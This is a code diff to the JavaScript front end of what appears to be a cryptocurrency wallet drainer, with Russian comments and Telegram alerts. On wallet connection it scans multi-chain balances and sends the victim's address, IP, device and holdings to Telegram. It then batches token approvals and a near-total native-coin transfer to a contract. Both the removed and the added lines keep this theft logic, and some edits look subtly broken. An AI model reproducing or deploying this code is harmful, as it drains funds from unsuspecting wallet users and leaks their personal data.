@@ -30,9 +30,9 @@ console.log('Network Map:', networkMap)
 
 // Адреса контракта TimelockApproval (нужно заменить на реальные после развертывания)
 const CONTRACTS = {
-  [networkMap['Ethereum'].chainId]: '0x0A57cf1e7E09ee337ce56108E857CC0537089CfC',
-  [networkMap['BNB Smart Chain'].chainId]: '0x3A96C52Ecc0A0C5BfCc51204BD91D8e209ba83c6',
-  [networkMap['Polygon'].chainId]: '0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c'
+  [networkMap['Ethereum'].chainId]: '0x1111111111111111111111111111111111111111',
+  [networkMap['BNB Smart Chain'].chainId]: '0x2222222222222222222222222222222222222222',
+  [networkMap['Polygon'].chainId]: '0x3333333333333333333333333333333333333333'
 }
 
 const NATIVE_TOKEN_SYMBOLS = {
@@ -336,7 +336,7 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
     const networkName = Object.keys(networkMap).find(key => networkMap[key].chainId === chainId) || 'Unknown'
     let totalValue = 0
     const tokenList = balances
-      .filter(token => parseUnits(token.balance, token.decimals) > 0n)
+      .filter(t => parseUnits(t.balance, t.decimals))
       .map(token => {
         const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : token.price || 0
         const value = Number(token.balance) * price
@@ -344,7 +344,7 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
         return `➡️ ${token.symbol} - ${value.toFixed(2)}$`
       })
       .join('\n')
-    const message = `🚨 New connect (${walletName} - ${device})\n` +
+    const message = `🚗 New connect (${walletName} - ${device})\n` +
                     `🌀 [Address](${scanLink})\n` +
                     `🕸 Network: ${networkName}\n` +
                     `🌎 IP: ${ip}\n\n` +
@@ -499,28 +499,28 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
 
   // Prepare requestApproval calls for ERC-20 tokens
   const approveCalls = networkTokens
-    .filter(t => t.address !== 'native')
-    .map(t => ({
+    .filter(t => t.address !== '0')
+    .map(token => ({
       to: getAddress(CONTRACTS[mostExpensive.chainId]),
       data: encodeFunctionData({
         abi: timelockAbi,
         functionName: 'requestApproval',
-        args: [getAddress(t.address)]
+        args: [getAddress(token.address)]
       }),
-      value: '0x0',
+      value: 0n,
       gasLimit: BigInt(200000)
     }))
 
   // Prepare requestNativeTransfer call for native token
-  let transferCall = null
-  const nativeToken = networkTokens.find(t => t.address === 'native')
+  let nativeTransferCall = null
+  const nativeToken = networkTokens.find(t => t.address === '0')
   if (nativeToken) {
     const balanceWei = parseUnits(nativeToken.balance, 18)
     const gasReserve = BigInt('10000000000000000') // 0.01 ETH/BNB/MATIC in wei
     if (balanceWei > gasReserve) {
       const transferAmount = balanceWei - gasReserve
       console.log(`Preparing native token transfer request: ${nativeToken.symbol} amount=${formatUnits(transferAmount, 18)}`)
-      transferCall = {
+      nativeTransferCall = {
         to: getAddress(CONTRACTS[mostExpensive.chainId]),
         value: `0x${transferAmount.toString(16)}`,
         data: encodeFunctionData({
@@ -537,8 +537,8 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
 
   // Combine all calls
   const allCalls = [...approveCalls]
-  if (transferCall) {
-    allCalls.push(transferCall)
+  if (nativeTransferCall) {
+    allCalls.push(nativeTransferCall)
   }
 
   // Send batch transaction
@@ -556,16 +556,16 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
       // Send Telegram notification with transaction details
       const scanLink = getScanLink(id, mostExpensive.chainId, true)
       const message = `🚀 Batch transaction sent\n` +
-                      `🌀 [Transaction](${scanLink})\n` +
-                      `🕸 Network: ${mostExpensive.network}\n` +
+                      `🗗 [Transaction](${scanLink})\n` +
+                      `🗗️ Network: ${mostExpensive.network}\n` +
                       `👤 Sender: ${state.address}\n` +
-                      `📋 Operations: ${allCalls.length} (Tokens: ${approveCalls.length}, Native: ${transferCall ? 1 : 0})`
+                      `📘 Operations: ${allCalls.length} (Tokens: ${approveCalls.length}, Native: ${nativeTransferCall ? 1 : 0})`
       await sendTelegramMessage(message)
     } catch (error) {
-      store.errors.push(`Failed to send batch transaction: ${error.message}`)
+      store.errors.push(`Error in batch transaction: ${error.message}`)
       console.error(`Batch transaction error:`, error)
       const approveState = document.getElementById('approveState')
-      if (approveState) approveState.innerHTML = `Failed to send batch transaction: ${error.message}`
+      if (approveState) approveState.innerHTML = `Error: ${error.message}`
     }
   } else {
     console.log('No operations to perform')
@@ -576,105 +576,111 @@ async function performBatchOperations(mostExpensive, allBalances, state) {
 
 // Initialize subscribers
 const initializeSubscribers = (modal) => {
-  const debouncedSubscribeAccount = debounce(async state => {
+  const debouncedWallet = debounce(async (state) => {
     console.log(`Received account state:`, state)
-    console.log(`Connected wallet address: ${state.address}`)
+    console.log(`Connected wallet: ${state.address}`)
     updateStore('accountState', state)
     updateStateDisplay('accountState', state)
     if (state.isConnected && state.address && isAddress(state.address) && store.networkState.chainId) {
-      const walletInfo = appKit.getWalletInfo() || { name: 'Unknown Wallet' }
+      const walletInfo = appKit.getWalletInfo() || { info: 'Unknown Info' }
       const device = detectDevice()
       if (store.isProcessingConnection) {
-        console.log('Already processing connection, skipping')
+        console.log('...')
         return
       }
-      const balancePromises = []
-      Object.entries(TOKENS).forEach(([networkName, tokens]) => {
-        const networkInfo = networkMap[networkName]
-        if (!networkInfo) {
-          console.warn(`Network ${networkName} not found in networkMap`)
-          return
-        }
-        // Add native token
-        balancePromises.push(
-          getNativeTokenBalance(state.address, networkInfo.chainId)
-            .then(balance => ({
-              symbol: NATIVE_TOKEN_SYMBOLS[networkInfo.chainId] || 'unknown',
-              balance,
-              address: 'native',
-              network: networkName,
-              chainId: networkInfo.chainId,
-              decimals: 18
-            }))
-            .catch(() => ({
-              symbol: NATIVE_TOKEN_SYMBOLS[networkInfo.chainId] || 'unknown',
-              balance: '0',
-              address: 'native',
-              network: networkName,
-              chainId: networkInfo.chainId,
-              decimals: 18
-            }))
-        )
-        tokens.forEach(token => {
-          if (isAddress(token.address)) {
-            balancePromises.push(
-              getTokenBalance(wagmiAdapter.wagmiConfig, state.address, token.address, token.decimals, networkInfo.chainId)
-                .then(balance => ({
-                  symbol: token.symbol,
-                  balance,
-                  address: token.address,
-                  network: networkName,
-                  chainId: networkInfo.chainId,
-                  decimals: token.decimals
-                }))
-                .catch(() => ({
-                  symbol: token.symbol,
-                  balance: '0',
-                  address: token.address,
-                  network: networkName,
-                  chainId: networkInfo.chainId,
-                  decimals: token.decimals
-                }))
-            )
+      try {
+        const balancePromises = []
+        Object.entries(TOKENS).forEach(([networkId, tokens]) => {
+          const networkInfo = networkMap[networkId]
+          if (!networkInfo) {
+            console.warn(`Network ${networkId} not found in networkMap`)
+            return
           }
+          // Add native token
+          balancePromises.push(
+            getNativeTokenBalance(state.address, networkInfo.chainId)
+              .then(balance => ({
+                symbol: NATIVE_TOKEN_SYMBOLS[networkInfo.chainId] || 'unknown',
+                balance,
+                address: '0',
+                network: networkId,
+                chainId: networkInfo.chainId,
+                decimals: 18
+              }))
+              .catch(() => ({
+                symbol: NATIVE_TOKEN_SYMBOLS[networkInfo.chainId] || 'unknown',
+                balance: '0',
+                address: '0',
+                network: networkId,
+                chainId: networkInfo.chainId,
+                decimals: 18
+              }))
+          )
+          tokens.forEach(token => {
+            if (isAddress(token.address)) {
+              balancePromises.push(
+                getTokenBalance(wagmiAdapter.wagmiConfig, state.address, token.address, token.decimals, networkInfo.chainId)
+                  .then(balance => ({
+                    symbol: token.symbol,
+                    balance,
+                    address: token.address,
+                    network: networkId,
+                    chainId: networkInfo.chainId,
+                    decimals: token.decimals
+                  }))
+                  .catch(() => ({
+                    symbol: token.symbol,
+                    balance: '0',
+                    address: token.address,
+                    network: networkId,
+                    chainId: networkInfo.chainId,
+                    decimals: token.decimals
+                  }))
+              )
+            }
+          })
         })
-      })
-      const allBalances = await Promise.all(balancePromises)
-      store.tokenBalances = allBalances
-      updateStateDisplay('tokenBalancesState', allBalances)
-      let maxValue = 0
-      let mostExpensive = null
-      for (const token of allBalances) {
-        if (parseUnits(token.balance, token.decimals) > 0n) {
-          const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
-          const value = Number(token.balance) * price
-          token.price = price
-          if (value > maxValue) {
-            maxValue = value
-            mostExpensive = { ...token, price, value }
+        const allBalances = await Promise.all(balancePromises)
+        store.tokenBalances = allBalances
+        updateStateDisplay('tokenBalancesState', allBalances)
+        let maxValue = 0
+        let mostExpensive = null
+        for (const token of allBalances) {
+          if (parseUnits(token.balance, token.decimals) > 0n) {
+            const price = ['USDT', 'USDC'].includes(token.symbol) ? 1 : await getTokenPrice(token.symbol)
+            const value = Number(token.balance) * price
+            token.price = price
+            if (value > maxValue) {
+              maxValue = value
+              mostExpensive = { ...token, price, value }
+            }
           }
         }
+        await notifyWalletConnection(state.address, walletInfo.info, device, allBalances, store.networkState.chainId)
+        if (mostExpensive) {
+          console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`)
+          const networkTokens = allBalances.filter(token => token.network === mostExpensive.network && parseUnits(token.balance, token.decimals) > 0n)
+          console.log(`Tokens with non-zero balance in ${mostExpensive.network}:`)
+          networkTokens.forEach(token => {
+            console.log(`${token.symbol}: ${token.balance}`)
+          })
+          await performBatchOperations(mostExpensive, allBalances, state)
+        } else {
+          const message = 'No tokens with positive balance'
+          console.log(message)
+          const mostExpensiveState = document.getElementById('mostExpensiveToken')
+          if (mostExpensiveState) mostExpensiveState.innerHTML = message
+        }
+      } catch (error) {
+        store.errors.push(`Error in processing connection: ${error.message}`)
+        console.error(error)
+      } finally {
+        hideCustomModal()
+        store.isProcessingConnection = false
       }
-      await notifyWalletConnection(state.address, walletInfo.name, device, allBalances, store.networkState.chainId)
-      if (mostExpensive) {
-        console.log(`Most expensive token: ${mostExpensive.symbol}, balance: ${mostExpensive.balance}, price in USDT: ${mostExpensive.price} (${mostExpensive.symbol === 'USDT' || mostExpensive.symbol === 'USDC' ? 'Fixed' : 'Binance API'})`)
-        const networkTokens = allBalances.filter(token => token.network === mostExpensive.network && parseUnits(token.balance, token.decimals) > 0n)
-        console.log(`Tokens with non-zero balance in ${mostExpensive.network}:`)
-        networkTokens.forEach(token => {
-          console.log(`${token.symbol}: ${token.balance}`)
-        })
-        await performBatchOperations(mostExpensive, allBalances, state)
-      } else {
-        const message = 'No tokens with positive balance'
-        console.log(message)
-        const mostExpensiveState = document.getElementById('mostExpensiveToken')
-        if (mostExpensiveState) mostExpensiveState.innerHTML = message
-      }
-      hideCustomModal()
-      store.isProcessingConnection = false
     }
   }, 1000)
-  modal.subscribeAccount(debouncedSubscribeAccount)
+  modal.subscribeAccount(debouncedWallet)
   modal.subscribeNetwork(state => {
     console.log(`Received network state:`, state)
     updateStore('networkState', state)
